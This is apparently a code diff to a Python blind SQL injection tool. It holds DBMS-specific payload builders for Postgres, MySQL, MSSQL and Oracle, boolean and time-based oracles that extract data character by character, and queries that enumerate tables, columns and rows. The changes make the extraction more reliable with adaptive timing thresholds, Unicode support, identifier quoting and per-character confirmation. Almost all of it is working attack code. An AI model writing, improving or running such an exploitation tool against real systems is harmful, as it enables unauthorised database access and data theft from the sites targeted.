@@ -80,6 +80,13 @@ class Dbms:
     def length(self, e):  return f"length(({e}))"
     def substr(self, e, p): return f"substr(({e}),{p},1)"
     def asc(self, ch):    return f"ascii({ch})"
+    def code_expr(self, ch): return f"ascii({ch})"   # Unicode code point of one char
+
+    # --- safe quoting ---
+    def quote_str(self, s):              # string literal
+        return "'" + s.replace("'", "''") + "'"
+    def quote_ident(self, name):         # identifier (table/column)
+        return '"' + name.replace('"', '""') + '"'
 
     # --- time-based payload fragments (return None if unsupported) ---
     def sleep_inline(self, cond, sleep): return None   # used after AND/OR
@@ -100,12 +107,12 @@ class Dbms:
                 "WHERE table_schema=current_schema()")
     def q_columns(self, t):
         return (f"SELECT string_agg(column_name,',') FROM information_schema.columns "
-                f"WHERE table_name='{t}'")
-    def q_count(self, t): return f"SELECT count(*) FROM {t}"
+                f"WHERE table_name={self.quote_str(t)}")
+    def q_count(self, t): return f"SELECT count(*) FROM {self.quote_ident(t)}"
     def concat_cols(self, cols):
-        return " || '|' || ".join(f"coalesce(cast({c} as text),'')" for c in cols)
+        return " || '|' || ".join(f"coalesce(cast({self.quote_ident(c)} as text),'')" for c in cols)
     def q_row(self, t, cols, off):
-        return f"SELECT {self.concat_cols(cols)} FROM {t} ORDER BY 1 LIMIT 1 OFFSET {off}"
+        return f"SELECT {self.concat_cols(cols)} FROM {self.quote_ident(t)} ORDER BY 1 LIMIT 1 OFFSET {off}"
 
 
 class Postgres(Dbms):
@@ -134,17 +141,18 @@ class MySQL(Dbms):
     def error_value(self, text):
         m = re.search(r"~([^'<>\"]+)", text)
         return m.group(1) if m else None
+    def quote_ident(self, name): return "`" + name.replace("`", "``") + "`"
     def q_current_db(self): return "SELECT database()"
     def q_tables(self):
         return ("SELECT group_concat(table_name) FROM information_schema.tables "
                 "WHERE table_schema=database()")
     def q_columns(self, t):
         return (f"SELECT group_concat(column_name) FROM information_schema.columns "
-                f"WHERE table_schema=database() AND table_name='{t}'")
+                f"WHERE table_schema=database() AND table_name={self.quote_str(t)}")
     def concat_cols(self, cols):
-        return "concat_ws('|'," + ",".join(cols) + ")"
+        return "concat_ws('|'," + ",".join(self.quote_ident(c) for c in cols) + ")"
     def q_row(self, t, cols, off):
-        return f"SELECT {self.concat_cols(cols)} FROM {t} ORDER BY 1 LIMIT {off},1"
+        return f"SELECT {self.concat_cols(cols)} FROM {self.quote_ident(t)} ORDER BY 1 LIMIT {off},1"
 
 
 class MSSQL(Dbms):
@@ -153,6 +161,8 @@ class MSSQL(Dbms):
     fingerprints = ["@@version LIKE 'Microsoft%'"]
     def length(self, e):  return f"len(({e}))"
     def substr(self, e, p): return f"substring(({e}),{p},1)"
+    def code_expr(self, ch): return f"unicode({ch})"   # UTF-16 code unit
+    def quote_ident(self, name): return "[" + name.replace("]", "]]") + "]"
     def sleep_stacked(self, cond, sleep):
         return f"IF ({cond}) WAITFOR DELAY '0:0:{max(1, int(round(sleep)))}'"
     def error_expr(self, inner):
@@ -163,11 +173,11 @@ class MSSQL(Dbms):
                 "WHERE table_type='BASE TABLE'")
     def q_columns(self, t):
         return (f"SELECT STRING_AGG(column_name,',') FROM information_schema.columns "
-                f"WHERE table_name='{t}'")
+                f"WHERE table_name={self.quote_str(t)}")
     def concat_cols(self, cols):
-        return "concat(" + ",'|',".join(cols) + ")"
+        return "concat(" + ",'|',".join(f"cast({self.quote_ident(c)} as nvarchar(4000))" for c in cols) + ")"
     def q_row(self, t, cols, off):
-        return (f"SELECT {self.concat_cols(cols)} FROM {t} "
+        return (f"SELECT {self.concat_cols(cols)} FROM {self.quote_ident(t)} "
                 f"ORDER BY (SELECT NULL) OFFSET {off} ROWS FETCH NEXT 1 ROWS ONLY")
 
 
@@ -176,17 +186,18 @@ class Oracle(Dbms):
     stacked = False
     fingerprints = ["(SELECT 1 FROM v$version WHERE rownum=1)=1"]
     # boolean works great; time/error left None (handled via boolean fallback)
+    def quote_ident(self, name): return name   # bare: Oracle folds unquoted idents to upper
     def q_current_db(self): return "SELECT SYS_CONTEXT('USERENV','DB_NAME') FROM dual"
     def q_tables(self):
         return "SELECT listagg(table_name,',') WITHIN GROUP (ORDER BY table_name) FROM user_tables"
     def q_columns(self, t):
         return (f"SELECT listagg(column_name,',') WITHIN GROUP (ORDER BY column_id) "
-                f"FROM user_tab_columns WHERE table_name='{t.upper()}'")
+                f"FROM user_tab_columns WHERE table_name={self.quote_str(t.upper())}")
     def concat_cols(self, cols):
-        return " || '|' || ".join(f"to_char({c})" for c in cols)
+        return " || '|' || ".join(f"to_char({self.quote_ident(c)})" for c in cols)
     def q_row(self, t, cols, off):
         return (f"SELECT {self.concat_cols(cols)} FROM "
-                f"(SELECT a.*, ROWNUM rn FROM (SELECT * FROM {t} ORDER BY 1) a "
+                f"(SELECT a.*, ROWNUM rn FROM (SELECT * FROM {self.quote_ident(t)} ORDER BY 1) a "
                 f"WHERE ROWNUM <= {off+1}) WHERE rn = {off+1}")
 
 
@@ -253,6 +264,17 @@ class Target:
                 self.headers[k.strip()] = v.strip()
             self.method = (a.method or ("POST" if a.data else "GET")).upper()
         self.proxies = {"http": a.proxy, "https": a.proxy} if a.proxy else None
+        self._baseline = None
+
+    def baseline(self, a):
+        """Median + stdev of normal (no-sleep) response latency, sampled once."""
+        if self._baseline is None:
+            xs = sorted(self.send("").elapsed for _ in range(max(3, a.cal_samples)))
+            med = xs[len(xs) // 2]
+            mean = sum(xs) / len(xs)
+            sd = (sum((x - mean) ** 2 for x in xs) / len(xs)) ** 0.5
+            self._baseline = (med, sd)
+        return self._baseline
 
     def _enc(self, p):
         return urllib.parse.quote_plus(p) if self.a.encode else p
@@ -298,15 +320,37 @@ class Oracle_:
         return None
 
     def char(self, query, pos):
-        lo, hi = self.a.cmin, self.a.cmax
-        expr = self.dbms.asc(self.dbms.substr(query, pos))
+        # binary-search the Unicode code point; ASCII stays in the fast 0-127 band,
+        # non-ASCII auto-extends so UTF-8 data isn't silently corrupted.
+        code = self.dbms.code_expr(self.dbms.substr(query, pos))
+        hi = 127
+        if self.fires(f"{code}>{hi}"):
+            hi = 255
+            cap = self.a.max_codepoint
+            while hi < cap and self.fires(f"{code}>{hi}"):
+                hi = min(hi * 8, cap)
+        lo = 0
         while lo < hi:
             mid = (lo + hi) // 2
-            if self.fires(f"{expr}>{mid}"):
+            if self.fires(f"{code}>{mid}"):
                 lo = mid + 1
             else:
                 hi = mid
-        return chr(lo)
+        try:
+            return chr(lo)
+        except ValueError:
+            return "�"
+
+    def char_confirmed(self, query, pos, tries=2):
+        """Extract a char and verify it with an equality check; redo on disagreement.
+        Cheap insurance against a single flipped response (esp. under --threads)."""
+        code = self.dbms.code_expr(self.dbms.substr(query, pos))
+        last = ""
+        for _ in range(tries + 1):
+            last = self.char(query, pos)
+            if self.fires(f"{code}={ord(last)}"):
+                return last
+        return last
 
 
 class BoolOracle(Oracle_):
@@ -324,7 +368,12 @@ class TimeOracle(Oracle_):
     def __init__(self, target, dbms, ctx, a):
         super().__init__(target, dbms, ctx, a)
         self.kind = "time-based"
-        self.thresh = a.threshold if a.threshold else a.sleep * 0.6
+        if a.threshold:                       # explicit absolute override
+            self.thresh = a.threshold
+        else:                                 # adaptive: baseline latency + margin
+            med, sd = target.baseline(a)
+            margin = max(a.sleep * 0.5, sd * 3)
+            self.thresh = min(med + margin, med + a.sleep * 0.85)
     def _payload(self, cond):
         if self.ctx.kind == "stacked":
             return f"{self.ctx.close};{self.dbms.sleep_stacked(cond, self.a.sleep)}{self.dbms.comment}"
@@ -528,7 +577,7 @@ def extract_search(oracle, a, state_path, sig, value="", length=None):
         todo = list(range(len(value) + 1, length + 1))
         chars = {}
         with ThreadPoolExecutor(max_workers=a.threads) as ex:
-            for pos, c in zip(todo, ex.map(lambda p: oracle.char(q, p), todo)):
+            for pos, c in zip(todo, ex.map(lambda p: oracle.char_confirmed(q, p), todo)):
                 chars[pos] = c
         value += "".join(chars[p] for p in sorted(chars))
         save_state(state_path, sig, length, value, oracle.t.count)
@@ -578,7 +627,7 @@ def read_scalar(target, det, a, query, cap=4096):
         return ""
     if a.threads > 1 and o.kind == "boolean-based":
         with ThreadPoolExecutor(max_workers=a.threads) as ex:
-            chars = list(ex.map(lambda p: o.char(query, p), range(1, n + 1)))
+            chars = list(ex.map(lambda p: o.char_confirmed(query, p), range(1, n + 1)))
         return "".join(chars)
     return "".join(o.char(query, p) for p in range(1, n + 1))
 
@@ -680,7 +729,9 @@ def main():
 
     tun = ap.add_argument_group("tuning")
     tun.add_argument("--sleep", type=float, default=3.0)
-    tun.add_argument("--threshold", type=float, default=0.0)
+    tun.add_argument("--threshold", type=float, default=0.0, help="absolute time threshold (default: adaptive from baseline)")
+    tun.add_argument("--cal-samples", type=int, default=5, dest="cal_samples", help="baseline latency samples for adaptive timing")
+    tun.add_argument("--max-codepoint", type=int, default=0x10FFFF, dest="max_codepoint", help="upper bound for Unicode extraction")
     tun.add_argument("--retries", type=int, default=1)
     tun.add_argument("--threads", type=int, default=1, help="parallel workers for boolean extraction")
     tun.add_argument("--maxlen", type=int, default=64)
